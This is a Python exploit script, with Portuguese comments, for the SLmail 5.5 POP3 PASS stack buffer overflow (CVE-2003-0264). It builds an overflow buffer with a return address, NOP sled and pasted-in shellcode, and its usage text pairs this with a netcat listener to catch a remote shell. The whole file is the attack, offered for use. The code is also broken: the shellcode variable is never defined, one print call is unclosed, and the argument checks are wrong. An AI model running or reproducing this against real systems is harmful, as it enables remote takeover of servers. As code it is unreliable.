# -*- coding: utf-8 -*-
#########################################################
#                                                       #
# SLmail 5.5 POP3 PASS Buffer Overflow               	#
# Coded by : Mednic                                     #
# https://github.com/mednic                             #
# Plain vanilla stack overflow in the PASS command  	#                                                  
#           /\                                          #
#          / \\ /\                                      #
#   /\  /\/  \\V  \/\                                   #
#  / \\/ // \\\\\ \\ \/\                                #
# // //The-Dark-Hall\/ \\                               #
#/SLmail-5.5-POP3-PASS.py\                              #
#########################################################
import socket
from time import sleep
import os
from sys import argv

target = argv[1]
porta = argv[2]

def help():
    error = """
    Mode de uso:
        $ ruby shellcode.rb 
            copie o hexadecial gerado e cole na linha 34 do arquivo python 
        
        $ ./slmail.py <host> <porta>
        $ nc -lnvp <porta-do-payload>
    """  
    print(error)

def main(target):
    os.system(['clear', 'cls'][os.name == 'nt'])
    #============================
    #--ensira-shellcode-aqui

    #===========================
    print ('Exploit - CVE-2003-0264\nplatforma: windows\nPOP3 SLmail-5.5 overflow :)')
    buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 39 + buf
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sleep(2)
    print '\nIniciando conexão ao servidor...\n'
    sleep(1)
    try:
    	s.connect((target, porta))
    	s.recv(1024)
    except:
        print ('Conexão recusada !')
        exit()
    s.settimeout(1)
    print('Enviando usuario...\n')
    s.send("USER guest\r\n")
    s.recv(1024)
    s.settimeout(1)
    print('Iniciando estouro de buffer...\n'
    s.send("PASS "+buffer+"\r\n")
    s.recv(1024)
    s.send("QUIT\r\n")
    s.close()
    

if argv < 2:
    help()
else:
    main(target)
